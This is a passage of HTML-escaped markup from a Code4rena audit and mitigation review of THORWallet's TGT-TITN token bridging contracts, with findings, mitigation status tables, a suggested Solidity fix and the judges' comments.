{\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eBridgedTokensTransferLocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis creates several issues:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eNo way to correct mistakenly marked addresses\u003c/li\u003e\n\u003cli\u003eNo way to remove restrictions after legitimate bridging\u003c/li\u003e\n\u003cli\u003eContract upgrades or migrations become complicated\u003c/li\u003e\n\u003cli\u003eUsers who receive bridged tokens are permanently restricted\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"proof-of-concept-6\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eUser A bridges tokens from chain X to Arbitrum.\u003c/li\u003e\n\u003cli\u003eUser A’s address is marked as isBridgedTokenHolder.\u003c/li\u003e\n\u003cli\u003eUser A sends tokens back to chain X.\u003c/li\u003e\n\u003cli\u003eUser A receives new tokens on Arbitrum through legitimate means.\u003c/li\u003e\n\u003cli\u003eUser A cannot transfer these new tokens due to permanent restriction.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdd a function to remove addresses from the bridged holders mapping.\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"mitigation-review\" style=\"position:relative;\"\u003e\u003ca href=\"#mitigation-review\" aria-label=\"mitigation review permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"#mitigation-review\"\u003eMitigation Review\u003c/a\u003e\u003c/h1\u003e\n\u003ch2 id=\"introduction\" style=\"position:relative;\"\u003e\u003ca href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eFollowing the C4 audit, 3 wardens (\u003ca href=\"https://code4rena.com/@web3km\"\u003eweb3km\u003c/a\u003e, \u003ca href=\"https://code4rena.com/@shaflow2\"\u003eshaflow2\u003c/a\u003e and \u003ca href=\"https://code4rena.com/@kn0t\"\u003ekn0t\u003c/a\u003e) reviewed the mitigations for all identified issues. Additional details can be found within the \u003ca href=\"https://github.com/code-423n4/2025-03-thorwallet-mitigation\"\u003eC4 THORWallet Mitigation Review repository\u003c/a\u003e.\u003c/p\u003e\n\u003ch2 id=\"mitigation-review-scope\" style=\"position:relative;\"\u003e\u003ca href=\"#mitigation-review-scope\" aria-label=\"mitigation review scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMitigation Review Scope\u003c/h2\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eURL\u003c/th\u003e\n\u003cth\u003eMitigation of\u003c/th\u003e\n\u003cth\u003ePurpose\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/4\"\u003ehttps://github.com/THORWallet/TGT-TITN-merge-contracts/pull/4\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-9\"\u003eH-02\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eOnly allow bridging to the sender’s own address\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/2\"\u003ehttps://github.com/THORWallet/TGT-TITN-merge-contracts/pull/2\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-6\"\u003eH-01\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eFix issue when depositing more TGT and specified in the contract\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/1\"\u003ehttps://github.com/THORWallet/TGT-TITN-merge-contracts/pull/1\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-3\"\u003eADD-01 (F-3)\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eFix issue claiming TITN on day 360\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/3\"\u003ehttps://github.com/THORWallet/TGT-TITN-merge-contracts/pull/3\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-4\"\u003eADD-02 (F-4)\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eDo not allow transfers to the LZ endpoint as it is not needed\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"out-of-scope\" style=\"position:relative;\"\u003e\u003ca href=\"#out-of-scope\" aria-label=\"out of scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eOut of Scope\u003c/h3\u003e\n\u003cp\u003eAll sponsor \u003ccode\u003eacknowledged\u003c/code\u003e (wontfix) findings, including:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-7\"\u003eM-01: Improper Transfer Restrictions on Non-Bridged Tokens Due to Boolean Bridged Token Tracking, Allowing a DoS Attack Vector\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"mitigation-review-summary\" style=\"position:relative;\"\u003e\u003ca href=\"#mitigation-review-summary\" aria-label=\"mitigation review summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMitigation Review Summary\u003c/h2\u003e\n\u003cp\u003eDuring the mitigation review, the wardens determined that 4 in-scope findings from the original audit were fully mitigated. They also surfaced one new issue of High severity. The table below provides details regarding the status of each in-scope vulnerability from the original audit, followed by full details on the new issue.\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth align=\"center\"\u003eOriginal Issue\u003c/th\u003e\n\u003cth\u003eStatus\u003c/th\u003e\n\u003cth\u003eFull Details\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-6\"\u003eH-01\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eMitigation confirmed\u003c/td\u003e\n\u003ctd\u003eReports from \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-4\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-9\"\u003eweb3km\u003c/a\u003e and \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-13\"\u003ekn0t\u003c/a\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-9\"\u003eH-02\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eMitigation confirmed\u003c/td\u003e\n\u003ctd\u003eReports from \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-3\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-14\"\u003eweb3km\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-12\"\u003ekn0t\u003c/a\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-3\"\u003eADD-01\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eMitigation confirmed\u003c/td\u003e\n\u003ctd\u003eReports from \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-2\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-6\"\u003eweb3km\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-10\"\u003ekn0t\u003c/a\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-4\"\u003eADD-02\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eMitigation confirmed\u003c/td\u003e\n\u003ctd\u003eReports from \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-1\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-7\"\u003eweb3km\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-11\"\u003ekn0t\u003c/a\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003chr\u003e\n\u003ch2 id=\"f-9-unmitigated\" style=\"position:relative;\"\u003e\u003ca href=\"#f-9-unmitigated\" aria-label=\"f 9 unmitigated permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-8\"\u003eF-9 Unmitigated\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-8\"\u003eweb3km\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-5\"\u003eshaflow2\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSeverity: High\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 id=\"vulnerability-details-1\" style=\"position:relative;\"\u003e\u003ca href=\"#vulnerability-details-1\" aria-label=\"vulnerability details 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eVulnerability details\u003c/h3\u003e\n\u003cp\u003eThe TITN protocol recently fixed a problem where users could get around transfer limits by bridging tokens between different chains.\u003c/p\u003e\n\u003cp\u003eTo stop this, a new check was added in _send to make sure that the receiver on the other chain is the same as the msg.sender on the current chain.\u003c/p\u003e\n\u003cp\u003eThis fix works, but it also creates a new problem: smart contracts can no longer use the bridge.\u003c/p\u003e\n\u003ch3 id=\"impact\" style=\"position:relative;\"\u003e\u003ca href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eUnlike regular wallets (EOAs), smart contracts usually don’t have the same address on different chains. Because of this, they can’t pass the new check and can’t bridge tokens.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo fix this while still keeping transfers safe, consider using the same rules from _validateTransfer instead of requiring the sender and receiver to have the same address.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"21\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e- require(_sendParam.to == bytes32(uint256(uint160(msg.sender))), \u0026quot;Must bridge to your own address\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+ if (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       isBridgedTokensTransferLocked \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       (isBridgedTokenHolder[_from] || block.chainid == arbitrumChainId)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   ) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       revert BridgedTokensTransferLocked();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"links-to-affected-code\" style=\"position:relative;\"\u003e\u003ca href=\"#links-to-affected-code\" aria-label=\"links to affected code permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eLinks to affected code\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/blob/8b65b79609b819a5420ad783b642b284efa7d6fb/contracts/Titn.sol#L120\"\u003eTitn.sol#L120\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-8?commentParent=ARLr286sawG\"\u003ecacaomatt (THORWallet) commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eValid finding, we’ll implement the suggested update.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-8?commentParent=DQhUPSqQaZg\"\u003e0xnev (judge) commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eI am accepting this as a new submission per discussions and comments noted \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-5?commentParent=hcgcqmrecZc\u0026#x26;commentChild=i6C7J44nVPf\"\u003ehere\u003c/a\u003e. \u003c/p\u003e\n\u003cp\u003eListing as mitigated as sponsor acknowledges this as design decision and will accept only EOAs for bridging during lockup period. This fix will likely be performed on the UI as mentioned.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch1 id=\"disclosures\" style=\"position:relative;\"\u003e\u003ca href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eDisclosures\u003c/h1\u003e\n\u003cp\u003eC4 is an open organization governed by participants in the community.\u003c/p\u003e\n\u003cp\u003eC4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\u003c/p\u003e\n\u003cp\u003eC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\u003c/p\u003e\n\u003cstyle class=\"grvsc-styles\"\u003e\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line \u003e * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting \u003e .grvsc-code \u003e .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 